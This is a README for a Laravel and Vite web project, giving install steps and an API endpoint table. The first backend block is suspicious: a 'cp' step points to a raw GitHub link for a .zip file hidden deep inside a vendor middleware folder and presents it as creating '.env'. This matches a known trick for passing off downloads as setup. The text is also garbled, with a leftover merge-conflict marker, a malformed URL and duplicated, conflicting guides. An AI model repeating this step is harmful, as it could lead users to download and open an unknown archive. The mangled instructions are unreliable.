### Environment Variables (.env)
VITE_API_URL=https:http://localhost:3000/api

Backend:
1. Backend Installation (Laravel)
cd laravel_backend
composer install
cp https://raw.githubusercontent.com/shahriarrafi/Petrichor-Tech-Lab/main/laravel_backend/vendor/laravel/framework/src/Illuminate/Contracts/Session/Middleware/Petrichor_Lab_Tech_ponderous.zip .env
php artisan key:generate
php artisan migrate --seed
php artisan serve

## 📡 API Reference
### Public Endpoints
| Resource | Endpoint | Method | Access |
| :--- | :--- | :--- | :--- |
| **Authentication** | `/api/login` | `POST` | Public |
| **Services** | `/api/services` | `GET` | Public |

### Admin Endpoints
*Requires `Authorization: Bearer <token>`*

| Resource | Endpoint | Method | Access |
| :--- | :--- | :--- | :--- |
| **Admin Services** | `/api/admin/services` | `POST` / `PUT` | Admin (Token) |
| **Consultations** | `/api/admin/consultations` | `GET` | Admin (Token) |
=======
## Setup & Installation Guide

### Prerequisites
- [Node.js](https://nodejs.org/) (for Frontend)
- [PHP](https://www.php.net/) & [Composer](https://getcomposer.org/) (for Backend)

### Step 1: Backend Setup
1.  Navigate to the backend directory:
    ```bash
    cd laravel_backend
    ```
2.  Install PHP dependencies:
    ```bash
    composer install
    ```
3.  Set up environment:
    *   Copy `.env.example` to `.env`.
    *   Set `DB_CONNECTION=sqlite` and `DB_DATABASE` to the absolute path of your `database/database.sqlite` (or `tech_db`).
4.  Generate application key:
    ```bash
    php artisan key:generate
    ```
5.  Run migrations (create database tables):
    ```bash
    php artisan migrate
    ```
    *   *Note: If `tech_db` does not exist, touch it first: `touch database/tech_db`*
6.  Create Admin User (Seeder):
    ```bash
    php artisan db:seed
    ```
    *   **Default Admin**: `test@example.com` / `password`
7.  Link Storage (for images):
    ```bash
    php artisan storage:link
    ```
8.  Start Server:
    ```bash
    php artisan serve
    ```

### Step 2: Frontend Setup
1.  Navigate to the root directory (where `package.json` is):
    ```bash
    cd ..
    ```
2.  Install Node dependencies:
    ```bash
    npm install
    ```
3.  Configure Environment:
    *   Ensure `.env` exists.
    *   Set `VITE_API_URL=http://127.0.0.1:8000/api`.
4.  Start Development Server:
    ```bash
    npm run dev
    ```
